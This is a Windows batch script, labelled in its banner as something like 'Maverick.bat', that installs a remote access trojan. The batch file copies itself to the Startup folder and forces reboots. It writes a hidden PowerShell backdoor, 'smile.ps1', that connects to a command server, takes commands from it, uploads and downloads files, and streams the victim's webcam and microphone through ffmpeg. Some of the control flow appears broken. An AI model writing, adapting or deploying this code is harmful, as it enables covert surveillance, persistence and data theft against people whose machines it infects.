echo  ____    ____       _  ____   ____  ________  _______     _____   ______  ___  ____      ______        _     _________  
echo |_   \  /   _|     / \|_  _| |_  _||_   __  ||_   __ \   |_   _|.' ___  ||_  ||_  _|    |_   _ \      / \   |  _   _  | 
echo   |   \/   |      / _ \ \ \   / /    | |_ \_|  | |__) |    | | / .'   \_|  | |_/ /        | |_) |    / _ \  |_/ | | \_| 
echo   | |\  /| |     / ___ \ \ \ / /     |  _| _   |  __ /     | | | |         |  __'.        |  __'.   / ___ \     | |     
echo  _| |_\/_| |_  _/ /   \ \_\ ' /     _| |__/ | _| |  \ \_  _| |_\ `.___.'\ _| |  \ \_  _  _| |__) |_/ /   \ \_  _| |_    
echo |_____||_____||____| |____|\_/     |________||____| |___||_____|`.____ .'|____||____|(_)|_______/|____| |____||_____|   
                                                                                                                        



@echo off
setlocal

:: Define paths
set "startupDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "batPath=%~f0"
set "pythonBatch=python.bat"
set "ffmpegBatch=ffmpeg.bat"
set "ps1Path=%startupDir%\smile.ps1"

:: Function to run a command as Administrator
:runAsAdmin
    set "params=%*"
    set "params=%params:"=\"%"
    powershell -Command "Start-Process cmd -ArgumentList '/c %params%' -Verb RunAs -WindowStyle Hidden"
    exit /b

:: 1. Check if the BAT file is in the Startup folder
if not exist "%startupDir%\%~nx0" (
    echo Copying BAT file to Startup folder...
    copy "%batPath%" "%startupDir%\%~nx0"
    echo Restarting the computer...
    shutdown /r /t 0
    exit /b
)

:: 2. Check if Python3 is installed
where python >nul 2>nul
if errorlevel 1 (
    echo Python3 is not installed. Running %pythonBatch%...
    call "%pythonBatch%"
)

:: 3. Check if FFmpeg is installed
where ffmpeg >nul 2>nul
if errorlevel 1 (
    echo FFmpeg is not installed. Running %ffmpegBatch%...
    call "%ffmpegBatch%"
)

:: 4. Check if smile.ps1 is in the Startup folder
if not exist "%ps1Path%" (
    echo Creating smile.ps1 in Startup folder...
    (
        echo $asciiART = @"
        echo   ____  ___       ___________     __________     ________     ____      
        echo  6MMMMb\`MMb     dMM'`MM'`MM'     `MMMMMMMMM     `MMMMMMMb.  6MMMMb\    
        echo 6M'    ` MMM.   ,PMM  MM  MM       MM      \      MM    `Mb 6M'    `    
        echo MM       M`Mb   d'MM  MM  MM       MM             MM     MM MM      __/ 
        echo YM.      M YM. ,P MM  MM  MM       MM    ,        MM     MM YM.     `MM 
        echo  YMMMMb  M `Mb d' MM  MM  MM       MMMMMMM        MM    .M9  YMMMMb  MM 
        echo      `Mb M  YM.P  MM  MM  MM       MM    `        MMMMMMM9'      `Mb MM 
        echo       MM M  `Mb'  MM  MM  MM       MM             MM              MM MM 
        echo       MM M   YP   MM  MM  MM       MM             MM              MM MM 
        echo L    ,M9 M   `'   MM  MM  MM    /  MM      / 68b  MM        L    ,M9 MM 
        echo MYMMMM9 _M_      _MM__MM__MMMMMMM _MMMMMMMMM Y89 _MM_       MYMMMM9 _MM_
        echo "@
        echo 
        echo # Print ASCII art
        echo Write-Host $asciiART
        echo
        echo # Function to run the script in a hidden window
        echo function Run-ScriptInHiddenWindow {
        echo     $scriptPath = $MyInvocation.MyCommand.Path
        echo     Start-Process "powershell.exe" -ArgumentList "-File `"$scriptPath`"" -WindowStyle Hidden
        echo }
        echo
        echo # Check if the script is already running
        echo function Is-ScriptRunning {
        echo     $currentProcessId = $pid
        echo     $currentProcess = Get-Process -Id $currentProcessId -ErrorAction SilentlyContinue
        echo     if ($null -eq $currentProcess) {
        echo         return $false
        echo     }
        echo     
        echo     # Filter by the process name and ensure it's the same executable
        echo     $processes = Get-Process | Where-Object { 
        echo         $_.Id -ne $currentProcessId -and $_.MainModule.FileName -eq $currentProcess.MainModule.FileName
        echo     }
        echo     return ($processes.Count -gt 0)
        echo }
        echo
        echo # Restart script if it's not running
        echo function Restart-ScriptIfNeeded {
        echo     if (-not (Is-ScriptRunning)) {
        echo         Write-Host "Script not running. Restarting..."
        echo         Run-ScriptInHiddenWindow
        echo         exit
        echo     }
        echo }
        echo
        echo # Run the script in a hidden window if it's not already running
        echo if (-not (Is-ScriptRunning)) {
        echo     Run-ScriptInHiddenWindow
        echo     exit
        echo }
        echo
        echo # Establish a connection to the server
        echo try {
        echo     $client = New-Object System.Net.Sockets.TcpClient
        echo     $client.Connect("127.0.0.2", 9965)  # Updated IP and port
        echo     $stream = $client.GetStream()
        echo     Write-Host "Connected to the server."
        echo }
        echo catch {
        echo     Write-Host "Error: Failed to connect to the server." -ForegroundColor Red
        echo     Write-Host "Details: $_"
        echo     exit
        echo }
        echo
        echo # Function to read a command from the server
        echo function Read-Command {
        echo     try {
        echo         $reader = New-Object System.IO.StreamReader($stream)
        echo         return $reader.ReadLine()
        echo     }
        echo     catch {
        echo         Write-Host "Error: Failed to read command from server." -ForegroundColor Red
        echo         Write-Host "Details: $_"
        echo         exit
        echo     }
        echo }
        echo
        echo # Function to send a file to the server
        echo function Send-File {
        echo     param ([string]$filePath)
        echo     try {
        echo         if (Test-Path $filePath) {
        echo             $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        echo             $stream.Write($fileBytes, 0, $fileBytes.Length)
        echo             Write-Host "File sent: $filePath"
        echo         } else {
        echo             Write-Host "Error: File not found: $filePath" -ForegroundColor Red
        echo         }
        echo     }
        echo     catch {
        echo         Write-Host "Error: Failed to send file." -ForegroundColor Red
        echo         Write-Host "Details: $_"
        echo     }
        echo }
        echo
        echo # Function to receive a file from the server
        echo function Receive-File {
        echo     param ([string]$outputPath)
        echo     try {
        echo         $buffer = New-Object byte[] 4096
        echo         $fileStream = [System.IO.File]::Create($outputPath)
        echo         while ($true) {
        echo             $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        echo             if ($bytesRead -eq 0) { break }
        echo             $fileStream.Write($buffer, 0, $bytesRead)
        echo         }
        echo         $fileStream.Close()
        echo         Write-Host "File received and saved to: $outputPath"
        echo     }
        echo     catch {
        echo         Write-Host "Error: Failed to receive file." -ForegroundColor Red
        echo         Write-Host "Details: $_"
        echo     }
        echo }
        echo
        echo # Function to open the camera and stream to the server
        echo function Open-Camera {
        echo     try {
        echo         Start-Process "ffmpeg" -ArgumentList "-f dshow -i video=0 -f mpegts udp://127.0.0.2:9999" -NoNewWindow
        echo         Write-Host "Camera opened and streaming to the server."
        echo     }
        echo     catch {
        echo         Write-Host "Error: Failed to open camera." -ForegroundColor Red
        echo         Write-Host "Details: $_"
        echo     }
        echo }
        echo
        echo # Function to open the microphone and stream to the server
        echo function Open-Microphone {
        echo     try {
        echo         Start-Process "ffmpeg" -ArgumentList "-f dshow -i audio=Microphone -f mpegts udp://127.0.0.2:9998" -NoNewWindow
        echo         Write-Host "Microphone opened and streaming to the server."
        echo     }
        echo     catch {
        echo         Write-Host "Error: Failed to open microphone." -ForegroundColor Red
        echo         Write-Host "Details: $_"
        echo     }
        echo }
        echo
        echo # Main loop to continuously read and execute commands from the server
        echo while ($true) {
        echo     try {
        echo         $command = Read-Command
        echo         if ([string]::IsNullOrEmpty($command)) {
        echo             Write-Host "Received empty or null command, waiting for a valid command..." -ForegroundColor Yellow
        echo             continue
        echo         }
        echo
        echo         switch ($command) {
        echo             "Open-Camera" {
        echo                 Open-Camera
        echo             }
        echo             "Upload-Files" {
        echo                 $filePath = "C:\path\to\file.txt"
        echo                 Send-File $filePath
        echo             }
        echo             "Download-Files" {
        echo                 $outputPath = "C:\path\to\output.txt"
        echo                 Receive-File $outputPath
        echo             }
        echo             "Open-Microphone" {
        echo                 Open-Microphone
        echo             }
        echo             "exit" {
        echo                 Write-Host "Closing connection."
        echo                 break
        echo             }
        echo             default {
        echo                 Write-Host "Unknown command: $command" -ForegroundColor Yellow
        echo             }
        echo         }
        echo     } catch {
        echo         Write-Host "Error occurred while processing command: $_" -ForegroundColor Red
        echo     }
        echo
        echo     # Check and restart script if needed
        echo     Restart-ScriptIfNeeded
        echo }
        echo
        echo # Close the network stream and the TCP connection
        echo $stream.Close()
        echo $client.Close()
    ) > "%ps1Path%"

    :: Restart the computer to apply changes
    echo Restarting the computer...
    shutdown /r /t 0
    exit /b
) else (
    :: Run smile.ps1 in a hidden window with admin rights
    echo Running smile.ps1...
    call :runAsAdmin "powershell -ExecutionPolicy Bypass -File \"%ps1Path%\""
)

endlocal
exit /b
